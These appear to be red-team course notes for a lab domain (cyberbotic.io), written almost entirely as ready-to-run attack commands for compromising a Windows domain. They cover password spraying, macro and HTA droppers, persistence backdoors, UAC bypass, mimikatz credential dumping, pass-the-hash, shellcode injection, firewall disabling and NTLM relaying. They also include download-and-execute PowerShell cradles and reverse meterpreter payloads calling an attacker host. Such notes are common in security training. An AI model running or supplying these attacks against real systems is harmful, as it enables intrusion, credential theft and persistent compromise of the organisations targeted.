# Initial compromise
## DNS records
```
dig cyberbotic.io+ short
```

```
whois 104.21.90.222
```

```
./dnscan.py -d cyberbotic.io -w subdomains-100.txt
```

Spoofcheck is a Python tool that can verify the email security of a given domain:
```
./spoofcheck.py cyberbotic.io
```

Or spoofy:
```
python3 spoofy.py -d cyberbotic.io -o stdout
```
## Password spray
Password spraying is an effective technique for discovering weak passwords that users are
notorious for using. Patterns such as MonthYear (August2019), SeasonYear (Summer2019)
and DayDate (Tuesday6) are very common.

Two excellent tools for password spraying against Office 365 and Exchange
are MailSniper and SprayingToolkit. On the attacker-windows VM, open PowerShell and
import MailSniper.ps1.

In powershell:
```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

Enumerate the NetBIOS name of the target domain with Invoke-DomainHarvestOWA:
```
Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100
```

Find names from https://cyberbotic.io website and put them in names.txt.

Use namemash.py to create permutations of usernames:
```
./namemash.py names.txt > possible-usernames.txt
```

Then with Invoke-UsernameHarvestOWA check if usernames are valid:
```
Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\possible-usernames.txt -OutFile valid.txt

Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain DEV -UserList .\possible-usernames.txt -OutFile valid.txt

Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
```

Spray passwords:
```
Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2021

Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
```

Download global address list:
```
Get-GlobalAddressList -ExchHostname 10.10.15.100 -UserName CYBER\iyates -Password Summer2021 -OutFile gal.txt
```
## Macro
Login to OWA, https://10.10.15.100.

Create HTA:
```
<html>
    <head>
        <title>Hello World/title>
    </head>
    <body>
	    <h2>Hello World</h2>
        <p>This is an HTA...</p>
    </body>
	<script language="VBScript">
		Function Pwn()
			Set shell = CreateObject("wscript.Shell")
			If shell.ExpandEnvironmentStrings("%PROCESSOS_ARCHITECHTURE%") = "AMD64" Then
				shell.run "calc"
			Else
				shell.run "calc"
			End If
		End Function
	Pwn
	</script>
</html>
```

Replace calc with beacon payload (scripted web delivery).
```
shell.run "powershell.exe -nop -w hidden -c "...""
```

Create VBA for macros (in word, view -> macros -> create, select Document 1, then create):
```
Sub AutoOpen()

	Dim Shell As Object
	Set Shell = CreateObject("wscript.shell")
	Shell.Run "calc"

End Sub
```

Alternative with WMI Win32_Process:
```
Sub AutoOpen()

	Dim proc As Object
	Set proc = GetObject("winmgmts\\.\root\cimv2:Win32:Process")
	proc.Create "powershell"

End Sub
```

Replace calc with beacon payload (scripted web delivery).
```
shell.run "powershell.exe -nop -w hidden -c "...""
```

Save word file as .doc.
## Remote template injection
Open Word on the Attacker Desktop, create a new blank document and insert your desired macro.  Save this to C:\\Payloads as a Word 97-2003 Template (*.dot) file. This is now our "malicious remote template". Use Cobalt Strike to host this file at http://nickelviper.com/template.dot.

Create a new document from the blank template located in C:\Users\Attacker\Documents\Custom Office Templates.

Then run:
```
remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
```
## HTML smuggling
```
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```
# Seatbelt
Build and use seatbelt to recon.

In beacon:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=user
```
# Misc enum
In beacon:
```
screenshot
keylogger
```

```
jobs
jobkill <JID>
```
# Persistence
## Task scheduler
Creating payload in windows:
```
$str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

Creating payload in linux:
```
set str 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
```

In beacon:
```
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <output from above>" -n "Updater" -m add -o hourly
```
## Startup folder
In beacon:
```
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <output from above>" -f "UserEnvEsetup" -m add
```

Look under **C:\\Users\\bfarmer\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\** for the file that was created.
## Registry autorun
In beacon:
```
cd C:\ProgramData
upload C:\Payloads\beacon-http.exe
mv beacon-http.exe updater.exe
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```
## DCOM hijack
Hunt Processes In Process Monitor Filter,
- Operation is RegOpenKey
- Result is NAME NOT FOUND
- Path ends with InprocServer32 Launch random applications to generate events

Look under **HKEY_CLASSES_ROOT\\CLSID** and **HKEY_CLASSES_ROOT\\Interface** for id:s that look like **{...}**.

In powershell, if its in HKLM but not in HKCU then we can hijack it:
```
Get-Item -Path "HKLM:\Software\Classes\CLSID\{...}\InprocServer32"
Get-Item -Path "HKCU:\Software\Classes\CLSID\{...}\InprocServer32"
```

Exploit:
```
New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "{...}"
New-Item -Path "HKCU:\Software\Classes\CLSID\{...}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{...}\InprocServer32" -Name "ThreadingModel" -Value Both
```

Generate payload in cobalt strike (windows executable (s), select windows dll).

```
cd C:\
upload C:\Payloads\beacon.dll
```

Find compatible tasks with powershell:
```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
	if ($Task.Actions.ClassId -ne $null)
	{
		if ($Task.Triggers.Enabled -eq $true)
		{
			if ($Task.Principal.GroupId -eq "Users")
			{
				Write-Host "Task-Name: " $Task.TaskName
				Write-Host "Task-Path: " $Task.TaskPath
				Write-Host "CLSID: " $Task.Actions.ClassId
				Write-Host
			}
		}
	}
}
```
## Windows services
This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START.  This means the service won't run until the machine is rebooted.  When the machine starts, so will the service, and it will be waiting for a connection. For these methods to work, you must be running in a high integrity Beacon:
```
cd C:\Windows
upload C:\Payloads\tcp-local_x64.svc.exe
mv tcp-local_x64.svc.exe legit-svc.exe
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```
## WMI event subscriptions
[PowerLurk](https://github.com/Sw4mpf0x/PowerLurk)

```
cd C:\Windows
upload C:\Payloads\dns_x64.exe
powershell-import C:\Tools\PowerLurk.ps1
powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```
# Privilege escalation
## Windows services
```
sc query
Get-Service | fl
```
## Unquoted service paths
```
run wmic service get name, pathname
```

```
powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```

 It will attempt to execute the following (in order):
 1. C:\\Program.ex
 2. C:\\Program Files\\Vulnerable.exe
 3. C:\\Program Files\\Vulnerable Services\\Service.exe

SharpUp will also list any services that match these conditions:
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
```

Exploit:
```
cd C:\Program Files\Vuln Services
ls
upload C:\Payloads\beacon-tcp-local-svc.exe
mv beacon-tcp-local-svc.exe Service.exe
```

```
run sc stop Vuln-Service-1
run sc start Vuln-Service-1
```

```
connect localhost 4444
```
## Weak service permissions
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe audit ModifiableServices
```

```
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expand Access
```

Exploit:
```
mkdir C:\Temp
cd C:\Temp
upload C:\Payloads\beacon-tcp-svc.exe
mv C:\Payloads\beacon-tcp-svc.exe fake-service.exe
run sc qc Vuln-Service-2
run sc config Vuln-Service-2 binPath= C:\Temp\fake-service.exe
run sc qc Vuln-Service-2
run sc query Vuln-Service-2
run sc stop Vuln-Service-2
run sc start Vuln-Service-2
connect localhost 4444
```
## Weak service binary permissions
```
powershell Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl
```

```
download Service 3.exe
upload C:\Payloads\Service 3.exe
<error, file is used by another process>
```

Generate payload Service 3.exe in cobalt strike.

```
run qc stop Vuln-Service-3
upload C:\Payloads\Service 3.exe
run qc start Vuln-Service-3
connect localhost 4444
```
## Always install elevated
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

Look for AlwaysInstallElevated registry keys and HKLM: 1 and HKCU: 1

Create project in Visual Studio, search for installer, select Setup Wizard.

Set name and location to C:\\Payloads, select place solution and project in same directory.

Choose files to add, click add and select generated payload from cobalt strike.

Right click project in Visual Studio, view -> custom actions
Right click install and select add custom action
Double click application folder, select beacon payload, click OK
Change Run64Bit to True in custom action properties

Build project

```
cd C:\Temp
upload C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi
run msiexec /i BeaconInstaller /q /n
connect localhost 4444
```
## UAC bypass
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac
```

Look for priv esc checks and if UAC can be bypassed:
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

```
elevate uac-schtasks tcp-4444-local
elevate uac-token-duplication tcp-4444-local
```

Or:
```
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/b"))"
connect localhost 4444
```

Not all UAC bypasses are equal, use seatbelt to list tokens:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges
```

Token duplication will give lower privileges, so you have to elevate further:
```
elevate svc-exe tcp-4444-local
```
# Domain recon
```
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```
## Get-Domain
You can use -Domain to specify the domain.
```
powershell Get-Domain
powershell Get-Domain -Domain cyberbotic.io
```
## Get-DomainController
Get domain controllers:
```
powershell Get-DomainController | select Forest, Name, OSVersion | fl
```
## Get-ForestDomain
You can use -Forest to specify the forest.
```
powershell Get-ForestDomain
powershell Get-ForestDomain -Forest cyberbotic.io
```
## Get-DomainPolicyData
Find policies such as password policy:
```
powershell Get-DomainPolicyData | select -expand SystemAccess
```
## Get-DomainUser
All users:
```
powershell Get-DomainUser | fl
```

Specific user:
```
powershell Get-DomainUser -Identity nlamb | fl
```

Get domain user by property and user:
```
powershell Get-DomainUser -Identity nlamb -Properties DisplayName, MemberOf | fl
```

Get all domain users by property:
```
powershell Get-DomainUser -Properties DisplayName, MemberOf | fl
```
## Get-DomainComputer
All computers:
```
powershell Get-DomainComputer
```

Get domain computer by property:
```
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
```
## Get-DomainOU
All OUs:
```
powershell Get-DomainOU
```

Get domain OU by property:
```
powershell Get-DomainOU -Properties Name | sort -Property Name
```
## Get-DomainGroup
All groups:
```
powershell Get-DomainGroup
```

Get domain groups by property:
```
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
```
## Get-DomainGroupMember
Get members of a specific domain group:
```
powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
```
## Get-DomainGPO
Get all GPOs:
```
powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
```

Get all GPOs for a computer:
```
powershell Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property DisplayName
```
## Get-DomainGPOLocalGroup
```
powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
```
## Get-DomainGPOUserLocalGroupMapping
Check if a specific domain user or group is a member of a specific local group:
```
powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
```
## Find-DomainUserLocation
Enumerate all machines and query the domain for users of a specified group. Finds the domain machines where those users are logged in:
```
powershell Find-DomainUserLocation | select UserName, SessionFromName
```
## Get-NetSession
CName is source IP.
```
powershell Get-NetSession -ComputerName dc-2 | select CName, UserName
```
## Get-DomainTrust
Get all domain trusts for the current domain:
```
powershell Get-DomainTrust
```

Get all domain trusts for the specific domain:
```
powershell Get-DomainTrust -Domain cyberbotic.io
```
## SharpView
You can use same commands in SharpView as for PowerView, its the .NET port of PowerView. Missing the piping ability as powershell.
```
execute-assembly C:\Tools\SharpView\SharpView\bin\Debug\SharpView.exe Get-Domain
```
## ADSearch
Example, search for all groups ending with Admins: 
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
```

Search for all objects whose category is "user" (i.e. domain users):
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "objectCategory=user"
```

These can be made more complex with further AND, OR and NOT conditions.  All attributes can be returned using the --full parameter, or specific attributes with the --attributes parameter:
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member
```
## BloodHound
Start neo4j:
```
cd C:\Tools\neo4j\bin
neo4j.bat console
```

Collect DcOnly and domain with SharpHound:
```
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound3.exe -c DcOnly -d cyberbotic.io
```

Collect all:
```
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound3.exe -c All
```

Then download BloodHound.zip and upload to BloodHound GUI.
### Cypher queries
Find all users with SPN set:
```
MATCH (u:User {hasspn:true}) RETURN u
```

Find all computers will AllowedToDelegate to other computers:
```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

Find shortest path from kerberoastable users (SPN set) to domain admin:
```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```
# Lateral movement
We can use jump, remote-exec or even seatbelt.
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
```

Always test local admin access on target before moving:
```
ls \\srv-1\c$
```
## Windows remote management
Check arch of target:
```
remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
```

Then jump (returns high integrity beacon):
```
jump winrm64 srv-1 smb
```
## PsExec
PsExec uploads a service binary to the target and then create a windows service to start and execute the binary.

Performs process migration automatically.

Returns SYSTEM beacon:
```
jump psexec64 srv-1 smb
```

**psexec_psh** doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit).  The pattern it uses by default is **%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <...>**:
```
jump psexec_psh web smb
```
## WMI
Part of remote-exec and we have to first upload a payload:
```
cd \\srv-1\ADMIN$
upload C:\Payloads\beacon-smb.exe
remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
```

Then link it:
```
link srv-1 smb
```
## CoInitializeSecurity
If **remote-exec wmi** does not work, and returns **"CoInitializeSecurity already called"**, our WMI execution must come from a different process.

We can use **spawn**, **spawnas** or even **execute-assembly** with **SharpWMI**:
```
execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv-1 command="C:\Windows\beacon-smb.exe"
```
## DCOM
```
powershell-import C:\Tools\Invoke-DCOM.ps1
powershell Invoke-DCOM -ComputerName srv-1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
```

Then link it:
```
link srv-1 smb
```
# Credentials and impersonation
Check for currently logged in users:
```
net logons
```
## NTLM hashes - LogonPasswords
Dump plaintext passwords from memory. This command requires elevated privileges.

Using mimikatz:
```
mimikatz sekurlsa::logonpasswords
mimikatz !sekurlsa::logonpasswords
```
The **!** elevates Beacon to SYSTEM before running the given command, which is useful in cases where you're running in high-integrity but need to impersonate SYSTEM. In most cases, **!** is a direct replacement for **token::elevate**.

Or short command:
```
logonpasswords
```

NTLM = RC4
eKeys = SHA256 or SHA128
## Kerberos encryption keys - eKeys
This command requires elevated privileges.

Dump eKeys:
```
mimikatz sekurlsa::ekeys
mimikatz !sekurlsa::ekeys
```

Look for aes256_hmac or aes128_hmac.
## SAM
This command requires elevated privileges.

Dump SAM:
```
mimikatz lsadump::sam
mimikatz token::elevate ; lsadump::sam
mimikatz !lsadump::sam
```

Contains NTLM hashes of local accounts only.
## DCSync
The **@** impersonates Beacon's thread token before running the given command, which is useful in cases where Mimikatz needs to interact with a remote system, such as with **dcsync**.  This is also compatible with other impersonation primitives such as **make_token** and **steal_token**.  For example:
```
make_token DEV\nlamb F3rrari
mimikatz @lsadump::dcsync /user:DEV\krbtgt
```

Or:
```
dcsync dev.cyberbotic.io DEV\krbtgt
```
This requires **GetNCChanges** which is usually only available to **domain admins**.
## Domain cached credentials
This command requires elevated privileges.

Dump cache:
```
mimikatz lsadump::cache
mimikatz !lsadump::cache
```

These credentials are rarely used but should be cracked offline.
## Make token
Impersonate a user knowing their plaintext password:
```
make_token DEV\jking Purpl3Drag0n
```

Revert to self, dispose of token:
```
rev2self
```
## Process injection
List processes:
```
ps
```

Inject into process with PID 3320:
```
inject 3320 x64 tcp-4444-local
```
## Token impersonation
Impersonate access token from target process, requires local admin:
```
steal_token 3320
```
## SpawnAs
Spawn a new process using plaintext credentials, does not require local admin:
```
spawnas DEV\jking Purpl3Drag0n tcp-4444-local
```

Common mistake is to run the command where you dont have read access. Run it in C:\.
## Pass the hash
Authenticate to a windows service using NTLM hash of a user:
```
pth DEV\jking <NTLM>
```

To avoid \\\\.pipe\\\ indicator in pth, use mimikatz and specify process:
```
mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /ntlm:<NTLM>
```

If we dont add /run, cmd.exe is used. Use for example powershell:
```
mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /run:powershell -w hidden /ntlm:<NTLM>
```

Then steal the token from the spawned process:
```
steal_token <PID>
```
## Overpass the hash
Authenticate with kerberos instead of NTLM, 4 steps.
- Request a TGT for the user that you want to impersonate
- Create a sacrificial logon session
- Pass the TGT to that logon session
- Access the target resource

With NTLM, using **/rc4** or **/ntlm**:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /rc4:<NTLM> /nowrap
```

Or use eKeys:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:<eKeys> /nowrap /opsec
```

To verify:
```
run klist
```

Next step, create a sacrificial logon session:
```
make_token DEV\jking FakePass
```

Now klist should list 0 tokens.

Pass the TGT to that logon session, in powershell:
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("...ticket..."))
```

Or in bash:
```
echo -en "...ticket..." | base64 -d > jkingTGT.kirbi
```

Use the TGT:
```
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
```

Now you can access the target resource.

If you are in an elevated context (SYSTEM), use rubeus:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:<eKeys> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
```

Then steal the token:
```
steal_token <PID>
```
## Extract kerberos tickets
List all kerberos tickets in all the logon sessions currently on the system, if elevated it shows all, else only in your logon session:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
```

Extract kerberos tickets from memory:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:<LUID> /nowrap
```

Create sacrificial process, using **createnetonly**, note the **LUID** and **ProcessID**:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```

Pass the TGT to the sacrificial logon session, using **ptt**:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:<LUID> /ticket:<...base64-ticket...>
```

Steal the access token of that process:
```
steal_token <PID>
```

Now you can access the target resource.

We can provide these options on the command line to make the fields appear less anomalous.  The password does not have to be the users' actual password:
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
```
# Password cracking
Basic hashcat cracking:
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt
```
**-a 0** is wordlist mode
**-m 1000** is NTLM hash
**ntlm.txt** is the NTLM hash to crack
**rockyou.txt** is the wordlist
## Wordlist + rules
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt -r rules/add-year.rule
```
-r rules/add-year.rule is our custom rule file

Add **$2$0$2$0** to the add-year.rule file. It will append 2020 to the words in rockyou.txt.
## Masks
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
```
**-a 3** is mask attack
**?u?l?l?l?l?l?l?l?d** is the mask

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -l ?d?s ?u?l?l?l?l?l?l?l?l
```
**-l** is custom charset
**?u?l?l?l?l?l?l?l?l** is the mask where **-l** is the custom charset
## Mask length & mask files
D:\\Tools\\example.hcmask:
```
?d?s,?u?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l?l?l
?d?s,?u?l?l?l?l?l?l?l?l?l
```

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt D:\Tools\example.hcmask
```

D:\\Tools\\example2.hcmask:
```
ZeroPointSecurity?d
ZeroPointSecurity?d?d
ZeroPointSecurity?d?d?d
ZeroPointSecurity?d?d?d?d
```

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt D:\Tools\example2.hcmask
```
## Combinator
D:\\Tools\\list1.txt:
```
purple
```

D:\\Tools\\list2.txt:
```
monkey
dishwasher
```

```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt D:\Tools\list1.txt D:\Tools\list2.txt -j $- -k $!
```

Will become purple-monkey!
## Hybrid
With wordlist and mask:
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt D:\Tools\list1.txt ?d?d?d?d
```
**-a 6** is hybrid wordlist and mask mode
**?d?d?d?d** is the mask

With mask and wordlist:
```
D:\Tools\hashcat-6.1.1\hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d D:\Tools\list1.txt
```
**-a 7** is hybrid mask and wordlist mode
**?d?d?d?d** is the mask
## Kwprocessor
Generate keywalk passwords:
```
D:\Tools\kwprocessor\kw64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
# Session passing
I can spawn a new HTTP session and work from there instead:
```
spawn x64 http
```

Spawn payloads that can talk to other cobalt strike listeners, or listeners of other C2 frameworks.

Metasploit:
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST eth0
set LPORT 8080
run
```

Create listener, add -> foreign http. Name it metasploit.

Spawn it in beacon:
```
spawn metasploit
```

Check metasploit for a session.

Alternative is to use **shinject** in beacon to inject arbitrary shellcode in to specified process:
```
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.120 LPORT=8080 -f raw -o /tmp/msf.bin
```

```
execute C:\Windows\System32\notepad.exe
ps
shinject <PID> x64 C:\Payloads\msf.bin
```

Or **shspawn** to spawn a process and inject it:
```
shspawn x64 C:\Payloads\msf.bin
```

Same can be done in reverse, generate beacon payload, windows executable (s), select raw as output, x64. Save to beacon.bin.

Metasploit, a session has to exist already:
```
use post/windows/manage/shellcode_inject
set SESSION 1
set SHELLCODE /tmp/beacon.bin
run
```
# Pivoting
## Socks proxy
Start socks4a proxy:
```
socks 1080
```

For SOCKS5:
```
socks 1080 socks5 disableNoAuth myUser myPassword enableLogging
```

Edit **/etc/proxychains.conf** to reflect.
```
#proxy_dns
remote_dns

socks4 127.0.0.1 1080
#socks5 127.0.0.1 1080 myUser myPassword
```

Use proxychains with a tool like nmap (use **-Pn** and **-sT**).
## Windows apps
Tunnel GUI apps with Proxifier.
1. Profile -> proxy servers -> add.
2. Profile -> proxification rules, add your app and target hosts

RSAT with clear text credentials:
```
runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
```

RSAT with NTLM:
```
mimikatz
privilege::debug
sekurlsa::pth /user:nlamb /domain:dev.cyberbotic.io /ntlm:<NTLM> /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
```

Remember to add entry to hosts file (C:\\windows\\system32\\drivers\\etc\\hosts).
## Kerberos
First, let's use **getTGT.py** to request a TGT for jking with their AES256 hash:
```
proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
```

```
export KRB5CCNAME=jking.ccache
```

Now we can use **psexec.py** to get a SYSTEM shell on WEB:
```
proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
```

Convert ticket:
```
echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi
ticketConverter.py bfarmer.kirbi bfarmer.ccache
```
## Browsers
Use FoxyProxy in firefox.
## Metasploit
```
setg Proxies socks4:10.10.5.120:1080
```
## Reverse port forward
### In powershell
```
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
$listener.Start()
Write-Host "Listening on port 4444"
while ($true)
{
	$client = $listener.AcceptTcpClient()
	Write-Host "A client has connected"
	$client.Close()
}
```

```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
```

```
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
### In beacon
Bind port 8080 on foothold machine and redirect to 10.10.5.120 port 80:
```
rportfwd 8080 10.10.5.120 80
```

```
rportfwd stop 8080
```

Forward to local machine:
```
rportfwd_local 8080 127.0.0.1 8080
```

Allow all ports:
```
New-NetFirewallRule -DisplayName "Allow All Inbound Ports" -Direction Inbound -Action Allow -Protocol Any

New-NetFirewallRule -DisplayName "Allow All Outbound Ports" -Direction Outbound -Action Allow -Protocol Any
```

Disable FW:
```
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

```
netsh advfirewall set allprofiles state off
```
### Pivot listeners
Right click beacon, pivoting -> listener.

Add allow rule:
```
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=tcp localport=4444
```

Remove rule:
```
netsh advfirewall firewall delete rule name="Allow 4444" protocol=tcp localport=4444
```
## NTLM relaying
```
powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445

powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

```
cd C:\Windows\System32\Drivers
upload C:\Tools\PortBender\WinDivert64.sys
```

Load **PortBender.cna** from **C:\\Tools\\PortBender** to cobalt strike.

Requires local admin to execute.

Redirect traffic from port **445** to **8445**:
```
PortBender redirect 445 8445
```

Relay traffic from port **8445** to port **445** to team server:
```
rportfwd 8445 127.0.0.1 445
```

Relay traffic from port **8080** to port **80** to team server:
```
rportfwd 8080 127.0.0.1 80
```

We need socks proxy for **ntlmrelayx** responses:
```
socks 1080
```

Now we can use **proxychains** and **ntlmrelayx**:
```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server
```

